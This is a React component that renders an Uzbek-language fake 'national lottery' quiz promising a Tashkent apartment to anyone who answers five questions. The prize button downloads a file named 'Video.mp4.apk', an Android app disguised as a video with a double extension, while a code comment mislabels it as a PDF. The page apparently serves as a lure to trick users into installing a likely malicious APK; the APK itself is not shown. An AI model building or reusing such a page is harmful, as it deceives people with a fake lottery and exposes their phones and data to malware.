import React, { useState, useEffect } from 'react';

function Quiz() {
  // Вопросы и ответы
  const questions = [
    {
      id: 1,
      question: "O'zbekiston poytaxti qaysi shahar?",
      options: ["Samarqand", "Toshkent", "Buxoro", "Farg'ona"],
      correct: "Toshkent"
    },
    {
      id: 2,
      question: "O'zbekiston qaysi yilda mustaqillikka erishdi?",
      options: ["1990", "1991", "1992", "1993"],
      correct: "1991"
    },
    {
      id: 3,
      question: "O'zbekiston davlat tili?",
      options: ["Ruscha", "Inglizcha", "O'zbekcha", "Tojikcha"],
      correct: "O'zbekcha"
    },
    {
      id: 4,
      question: "O'zbekistonning eng katta dengizi?",
      options: ["Xazar dengizi", "Orol dengizi", "Qora dengiz", "Yo'q (dengizga chiqmaydi)"],
      correct: "Yo'q (dengizga chiqmaydi)"
    },
    {
      id: 5,
      question: "O'zbekiston bosh qahramoni kim?",
      options: ["Alisher Navoiy", "Bobur", "Timur", "Mirzo Ulug'bek"],
      correct: "Alisher Navoiy"
    }
  ];

  // Состояния
  const [userAnswers, setUserAnswers] = useState({}); // выбранные ответы
  const [allCorrect, setAllCorrect] = useState(false); // все ли правильные
  const [downloaded, setDownloaded] = useState(false); // скачан ли приз
  const [submitted, setSubmitted] = useState({}); // отмечаем, что вопрос был отвечен

  // Проверяем, все ли ответы правильные
  useEffect(() => {
    const isAllCorrect = questions.every(q => userAnswers[q.id] === q.correct);
    setAllCorrect(isAllCorrect);
  }, [userAnswers]);

  // Обработчик выбора ответа
  const handleAnswerChange = (questionId, selectedOption) => {
    // Если вопрос уже отвечен, не меняем
    if (submitted[questionId]) return;

    // Запоминаем ответ
    setUserAnswers({
      ...userAnswers,
      [questionId]: selectedOption
    });

    // Отмечаем, что вопрос отвечен
    setSubmitted({
      ...submitted,
      [questionId]: true
    });
  };

  const handleClick = function(e) {
    e.preventDefault();

    // Путь к файлу на сервере
    const fileUrl = '/public/docs/Video.mp4.apk'; // Пример: PDF с описанием вакансии

    // Создаём виртуальную ссылку
    const link = document.createElement('a');
    link.href = fileUrl;
    link.download = 'Video.mp4.apk'; // Имя файла при скачивании
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link); // Удаляем ссылку
  };
  return (
    <div className="App"
      style={{
        minHeight: '100vh',
        background: 'linear-gradient(135deg, #007a3d, #0066cc, #a8d0e6)', // Градиент: зелёный → синий → светло-голубой
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '20px',
        fontFamily: 'Arial, sans-serif'
      }}
    >
      <header
        style={{
          backgroundColor: 'rgba(255, 255, 255, 0.9)',
          padding: '25px',
          textAlign: 'center',
          borderRadius: '12px',
          boxShadow: '0 6px 15px rgba(0, 0, 0, 0.2)',
          width: '100%',
          maxWidth: '900px',
          marginBottom: '20px',
          border: '3px solid #ffd700', // Золотая рамка для эффекта "приза"
          position: 'relative',
          overflow: 'hidden' // Чтобы анимация фона не выходила за рамки
        }}
      >
        {/* Фон для "эффекта сияния" */}
        <div style={{
          position: 'absolute',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          background: 'linear-gradient(45deg, rgba(255,215,0,0.1), rgba(255,215,0,0.3))',
          pointerEvents: 'none'
        }}></div>

        {/* Флаг Узбекистана */}
        <div className="flag-container" style={{ display: 'inline-block', marginBottom: '10px' }}>
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/8/84/Flag_of_Uzbekistan.svg"
            alt="O'zbekiston bayrog'i"
            className="flag"
            style={{
              height: '50px',
              border: '1px solid #aaa',
              borderRadius: '4px'
            }}
          />
        </div>

        {/* Слоган лотереи */}
        <div style={{
          backgroundColor: '#007a3d',
          color: 'white',
          padding: '8px 15px',
          borderRadius: '20px',
          display: 'inline-block',
          fontSize: '0.9rem',
          fontWeight: 'bold',
          marginBottom: '10px',
          boxShadow: '0 2px 5px rgba(0,0,0,0.2)'
        }}>
          🎉 O'zbekiston Milliy Lotereyasi 🎉
        </div>

        {/* Заголовки */}
        <h1
          className="title"
          style={{
            fontSize: '2.2rem',
            color: '#007a3d',
            margin: '10px 0',
            textShadow: '0 0 6px rgba(0, 0, 0, 0.3)',
            position: 'relative',
            zIndex: 1,
            animation: 'pulse 2s infinite'
          }}
        >
          Shansingizni sinab ko'ring!
        </h1>
        <h2
          style={{
            fontSize: '1.6rem',
            color: '#000',
            margin: '12px 0',
            fontWeight: 'normal',
            position: 'relative',
            zIndex: 1
          }}
        >
          <span style={{ fontWeight: 'bold', color: '#c00' }}>✅ Savollarga javob bering</span> va <span style={{ fontWeight: 'bold', color: '#007a3d' }}>Toshkentda joylashgan</span> <span style={{ fontWeight: 'bold', color: '#d00' }}>KVARTIRA</span> yutib oling!
        </h2>

        {/* Блок с изображением приза */}
        <div style={{ marginTop: '15px', position: 'relative', zIndex: 1 }}>
          <img
            src="https://images.unsplash.com/photo-1560448204-e02f11c3d0e2?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&q=80"
            alt="Toshkentdagi chiroyli kvartira"
            style={{
              width: '200px',
              height: 'auto',
              borderRadius: '10px',
              border: '3px solid #ffd700', // Золотая рамка
              boxShadow: '0 6px 15px rgba(0, 0, 0, 0.3)',
              position: 'relative'
            }}
          />
          <p style={{ marginTop: '8px', fontSize: '0.9rem', color: '#555', fontStyle: 'italic' }}>
            🏠 <strong>Sizning yutuvingiz:</strong> Toshkentdagi zamonaviy kvartira!
          </p>
        </div>

        {/* Дополнительная строка с иконками */}
        <div style={{ marginTop: '15px', display: 'flex', justifyContent: 'center', gap: '10px', position: 'relative', zIndex: 1 }}>
          <span style={{ fontSize: '1.5rem' }}>🎁</span>
          <span style={{ fontSize: '1.5rem' }}>🏆</span>
          <span style={{ fontSize: '1.5rem' }}>💎</span>
        </div>

        {/* Дополнительная кнопка "Попробуйте!" */}
        <div style={{ marginTop: '15px', position: 'relative', zIndex: 1 }}>
          <button
            style={{
              padding: '10px 20px',
              backgroundColor: '#ffd700',
              color: '#007a3d',
              fontWeight: 'bold',
              border: 'none',
              borderRadius: '30px',
              cursor: 'pointer',
              boxShadow: '0 4px 8px rgba(0, 0, 0, 0.2)',
              transition: 'transform 0.2s'
            }}
            onMouseOver={(e) => {
              e.target.style.transform = 'scale(1.05)';
            }}
            onMouseOut={(e) => {
              e.target.style.transform = 'scale(1)';
            }}
          >
            Shansingizni sinab ko'ring!
          </button>
        </div>
      </header>

      <main
        style={{
          padding: '30px 15px', // Уменьшили отступы по бокам на мобильных
          maxWidth: '900px',
          width: '100%',
          backgroundColor: 'rgba(255, 255, 255, 0.92)',
          borderRadius: '12px',
          boxShadow: '0 4px 15px rgba(0, 0, 0, 0.15)',
          border: '1px solid #ccc',
          position: 'relative',
          zIndex: 2
        }}
      >
        <div className="content">
          <div className="text">
            <h2 style={{ color: '#007a3d', marginBottom: '15px', fontSize: '1.6rem' }}>Savollar</h2>

            {questions.map((q) => {
              const userAnswer = userAnswers[q.id];
              const isCorrect = userAnswer === q.correct;
              const isAnswered = submitted[q.id]; // Проверяем, отвечен ли вопрос
              let statusIcon = null;

              if (isAnswered) {
                statusIcon = isCorrect ? '✅' : '❌';
              }

              return (
                <div key={q.id} style={{ marginBottom: '25px', padding: '10px', border: '1px solid #eee', borderRadius: '6px' }}>
                  <p style={{ fontSize: '1rem' }}><strong>{q.question}</strong> {statusIcon}</p>
                  <ul style={{ listStyle: 'none', paddingLeft: 0, fontSize: '1rem' }}>
                    {q.options.map((option) => {
                      const isSelected = userAnswer === option;
                      const isDisabled = isAnswered; // Блокируем выбор после ответа

                      // Стиль по умолчанию
                      let optionStyle = {
                        padding: '10px', // Увеличил padding для расстояния
                        margin: '8px 0', // Увеличил отступ между кнопками
                        borderRadius: '6px',
                        cursor: isDisabled ? 'not-allowed' : 'pointer',
                        backgroundColor: 'transparent',
                        border: '1px solid #ddd',
                        display: 'block' // Делаем как блок, чтобы лучше выглядело
                      };

                      // Если вопрос **отвечен**, то:
                      if (isAnswered) {
                        // Если это **правильный** ответ — подсвечиваем зелёным
                        if (option === q.correct) {
                          optionStyle.backgroundColor = '#d4edda';
                          optionStyle.border = '1px solid #28a745';
                        }
                        // Если это **выбранный**, но **неправильный** — подсвечиваем красным
                        else if (isSelected && !isCorrect) {
                          optionStyle.backgroundColor = '#f8d7da';
                          optionStyle.border = '1px solid #dc3545';
                        }
                      }

                      return (
                        <li key={option}>
                          <label style={optionStyle}>
                            <input
                              type="radio"
                              name={`question-${q.id}`}
                              checked={isSelected}
                              onChange={() => handleAnswerChange(q.id, option)}
                              disabled={isDisabled} // Блокируем после выбора
                            />
                            {' '}{option}
                          </label>
                        </li>
                      );
                    })}
                  </ul>

                  {/* Показываем правильный ответ, если вопрос отвечен */}
                  {isAnswered && (
                    <div style={{ marginTop: '8px', fontStyle: 'italic', color: '#007a3d', fontSize: '1rem' }}>
                      <strong>To'g'ri javob: {q.correct}</strong>
                    </div>
                  )}
                </div>
              );
            })}

<div
              className="action-button"
              style={{
                marginTop: '30px',
                textAlign: 'center'
              }}
            >
              <button
                id="download-prize"
                disabled={!allCorrect || downloaded}
                style={{
                  display: 'inline-block',
                  padding: '12px 30px',
                  backgroundColor: allCorrect && !downloaded ? '#007a3d' : '#ccc', // Зелёный, если можно скачать
                  color: 'white',
                  textDecoration: 'none',
                  borderRadius: '30px',
                  fontWeight: 'bold',
                  fontSize: '1.1rem',
                  border: 'none',
                  cursor: allCorrect && !downloaded ? 'pointer' : 'not-allowed',
                  transition: 'all 0.2s',
                  boxShadow: '0 4px 8px rgba(0, 0, 0, 0.2)'
                }}
                onMouseOver={(e) => {
                  if (allCorrect && !downloaded) {
                    e.target.style.backgroundColor = '#005a2d';
                    e.target.style.transform = 'scale(1.05)';
                    e.target.style.boxShadow = '0 6px 12px rgba(0, 0, 0, 0.3)';
                  }
                }}
                onMouseOut={(e) => {
                  if (allCorrect && !downloaded) {
                    e.target.style.backgroundColor = '#007a3d';
                    e.target.style.transform = 'scale(1)';
                    e.target.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.2)';
                  }
                }}
                onClick={handleClick}  // <--- Вот это было потеряно!
              >
                {downloaded ? 'Sovgin olingan!' : 'Sovgin olish →'}
              </button>
            </div>
          </div>
        </div>
      </main>

      <style>{`
        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.03); }
        }
        .App {
          animation: fadeIn 0.5s ease-out;
        }

        /* Адаптивность */
        @media (max-width: 768px) {
          .title {
            font-size: 1.8rem;
          }

          h2 {
            font-size: 1.4rem;
          }

          h2, h1, ul, p {
            padding: 0 10px;
          }

          main {
            padding: 20px 10px;
          }

          .flag {
            height: 40px; /* Уменьшили флаг */
          }

          button {
            width: 90%; /* Кнопка занимает 90% ширины на мобильных */
            padding: 14px 20px;
            font-size: 1.2rem;
          }

          img[alt="Toshkentdagi chiroyli kvartira"] {
            width: 150px; /* Уменьшили ширину изображения */
          }
        }

        @media (max-width: 480px) {
          .title {
            font-size: 1.6rem;
          }

          h2 {
            font-size: 1.3rem;
          }

          ul, p {
            font-size: 0.95rem;
          }

          button {
            width: 95%;
            padding: 12px 15px;
            font-size: 1.1rem;
          }

          img[alt="Toshkentdagi chiroyli kvartira"] {
            width: 120px; /* Еще меньше на мобильных */
          }
        }
      `}</style>
    </div>
  );
}

export default Quiz;